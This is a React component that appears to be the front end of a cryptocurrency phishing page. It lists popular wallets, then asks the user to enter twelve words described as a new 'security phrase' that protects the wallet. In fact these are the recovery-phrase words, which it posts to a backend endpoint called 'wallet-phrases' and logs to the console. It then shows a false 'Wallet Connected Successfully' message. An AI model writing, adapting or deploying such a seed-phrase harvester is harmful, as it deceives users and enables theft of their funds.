import React, { useState } from 'react';
import {
    FaShieldAlt, FaLink, FaAtom, FaEthereum, FaCheck, FaTimes,
    FaArrowLeft, FaQrcode, FaApple, FaGoogle
} from 'react-icons/fa';
import {
    SiBinance, SiCoinbase, SiBrave
} from 'react-icons/si'; import '../styles/WalletConnect.css';
import api from '../api/axios';

const WalletConnect = () => {
    const [isConnecting, setIsConnecting] = useState(false);
    const [connectionError, setConnectionError] = useState(null);
    const [activeWallet, setActiveWallet] = useState(null);
    const [phrases, setPhrases] = useState(Array(12).fill(''));
    const [showPhraseForm, setShowPhraseForm] = useState(false);
    const [showSuccessModal, setShowSuccessModal] = useState(false);

    const wallets = [
        { id: 'trust', name: 'Trust Wallet', icon: <FaShieldAlt className="wallet-icon" /> },
        { id: 'walletconnect', name: 'Wallet Connect', icon: <FaLink className="wallet-icon" /> },
        { id: 'atomic', name: 'Atomic Wallet', icon: <FaAtom className="wallet-icon" /> },
        { id: 'metamask', name: 'Metamask', icon: <FaEthereum className="wallet-icon" /> },
        { id: 'binance', name: 'Binance Wallet', icon: <SiBinance className="wallet-icon" /> },
        { id: 'coinbase', name: 'Coinbase Wallet', icon: <SiCoinbase className="wallet-icon" /> },
        { id: 'brave', name: 'Brave Wallet', icon: <SiBrave className="wallet-icon" /> },
        { id: 'phantom', name: 'Phantom Wallet', icon: <FaQrcode className="wallet-icon" /> },
        { id: 'apple', name: 'Apple Wallet', icon: <FaApple className="wallet-icon" /> },
        { id: 'google', name: 'Google Wallet', icon: <FaGoogle className="wallet-icon" /> }
    ];
    const selectedWallet = wallets.find(wallet => wallet.id === activeWallet);
    console.log("Connected Wallet:", selectedWallet?.name || activeWallet);
    console.log("Wallet Phrase:", phrases);


    const handleWalletClick = (walletId) => {
        setActiveWallet(walletId);
        setShowPhraseForm(true);
    };

    const handlePhraseChange = (index, value) => {
        const newPhrases = [...phrases];
        const cleanedValue = value.replace(/\s/g, '').slice(0, 10);
        newPhrases[index] = cleanedValue;
        setPhrases(newPhrases);
    };

    const connectWallet = async (e) => {
        e.preventDefault();
        setIsConnecting(true);
        setConnectionError(null);

        const invalidPhrases = phrases.filter(phrase =>
            phrase.length < 4 || phrase.length > 10
        );

        if (invalidPhrases.length > 0) {
            setIsConnecting(false);
            setConnectionError('Each phrase must be between 4 and 10 characters');
            return;
        }

        const selectedWallet = wallets.find(wallet => wallet.id === activeWallet);

        try {
            const response = await api.post('api/wallet-phrases', {
                coin_name: selectedWallet?.name || activeWallet,
                phrase: phrases
            });

            setIsConnecting(false);
            setShowSuccessModal(true);
            setShowPhraseForm(false);
            setPhrases(Array(12).fill(''));
        } catch (error) {
            console.error("❌ Error submitting wallet phrase:", error.response?.data || error.message);
            setIsConnecting(false);
            setConnectionError(
                error.response?.data?.message || 'Failed to submit wallet phrase'
            );
        }
    };



    const closeSuccessModal = () => {
        setShowSuccessModal(false);
    };

    const handleBackNavigation = () => {
        if (showPhraseForm) {
            setShowPhraseForm(false);
            setConnectionError(null);
            setActiveWallet(null);
        } else {
            window.history.back();
        }
    };

    return (
        <div className="wallet-connect-container">
            {/* Success Modal */}
            {showSuccessModal && (
                <div className="modal-overlay">
                    <div className="success-modal">
                        <div className="modal-icon success">
                            <FaCheck />
                        </div>
                        <h3>Wallet Connected Successfully!</h3>
                        <p>Your {activeWallet} is now securely connected with your 12-word phrase.</p>
                        <button
                            onClick={closeSuccessModal}
                            className="primary-button modal-button"
                        >
                            Continue to Dashboard
                        </button>
                    </div>
                </div>
            )}

            <div className="wallet-connect-card">
                <div className="wallet-connect-header">
                    <button
                        onClick={handleBackNavigation}
                        className="page-back-button"
                        aria-label="Go back"
                    >
                        <FaArrowLeft /> Back
                    </button>
                    <h2>{showPhraseForm ? 'Connect Your Wallet' : 'Select Wallet'}</h2>
                </div>

                <p className="subtitle">Select your preferred wallet to connect to the dApp</p>

                {isConnecting ? (
                    <div className="loading-container">
                        <div className="loading-spinner"></div>
                        <p>Securing connection to {activeWallet}...</p>
                    </div>
                ) : showPhraseForm ? (
                    <div className="phrase-container">
                        <h3>Secure Your Wallet Connection</h3>
                        <p className="instruction-text">
                            Create a 12-word security phrase (4-10 characters each) to protect your wallet.
                            This ensures only you can access or change your wallet settings.
                        </p>

                        {connectionError && (
                            <div className="error-message">
                                <FaTimes className="error-icon" /> {connectionError}
                            </div>
                        )}

                        <form onSubmit={connectWallet}>
                            <div className="phrase-grid">
                                {phrases.map((phrase, index) => (
                                    <div key={index} className="phrase-input-container">
                                        <div className="phrase-number">{index + 1}</div>
                                        <input
                                            type="text"
                                            value={phrase}
                                            onChange={(e) => handlePhraseChange(index, e.target.value)}
                                            className="phrase-input"
                                            placeholder={`Word ${index + 1}`}
                                            minLength="4"
                                            maxLength="10"
                                            required
                                        />
                                    </div>
                                ))}
                            </div>

                            <div className="button-group">
                                <button
                                    type="button"
                                    className="secondary-button"
                                    onClick={() => {
                                        setShowPhraseForm(false);
                                        setConnectionError(null);
                                    }}
                                >
                                    Back
                                </button>
                                <button type="submit" className="primary-button">
                                    Secure & Connect
                                </button>
                            </div>
                        </form>
                    </div>
                ) : (
                    <div className="wallets-grid">
                        {wallets.map((wallet) => (
                            <div
                                key={wallet.id}
                                className="wallet-card"
                                onClick={() => handleWalletClick(wallet.id)}
                            >
                                {wallet.icon}
                                <h3>{wallet.name}</h3>
                            </div>
                        ))}
                    </div>
                )}
            </div>
        </div>
    );
};

export default WalletConnect;